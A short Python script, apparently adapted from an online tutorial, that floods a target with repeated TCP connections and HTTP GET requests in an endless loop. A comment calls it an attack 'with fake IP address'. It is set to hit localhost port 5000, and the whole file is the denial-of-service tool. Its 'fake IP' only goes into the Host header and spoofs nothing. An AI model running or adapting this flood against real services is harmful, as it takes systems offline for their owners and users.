import socket
import threading

#socket and port attack with fake IP address
#https://www.neuralnine.com/code-a-ddos-script-in-python/

def attack(target,fake_ip, port):
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()

def main():
    target = '127.0.0.1' #target ip 
    fake_ip = '192.0.0.1' #pretend to be someone else
    port = 5000
    attack(target, fake_ip, port)

if __name__ == "__main__":
    main()
